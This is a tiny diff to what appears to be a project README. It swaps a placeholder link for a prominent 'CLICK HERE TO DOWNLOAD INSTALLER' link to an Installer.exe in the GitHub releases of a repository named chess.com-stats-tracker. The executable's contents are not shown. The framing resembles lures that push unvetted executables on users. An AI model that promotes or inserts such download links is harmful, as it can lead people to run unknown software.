@@ -1,4 +1,4 @@
- # 😜 [CLICK HERE TO DOWNLOAD INSTALLER](https://example.com/path/to/file)
+ # 😜 [CLICK HERE TO DOWNLOAD INSTALLER](https://github.com/NOTGTM/chess.com-stats-tracker/releases/download/V5.6/Installer.exe)
 
 ###
 
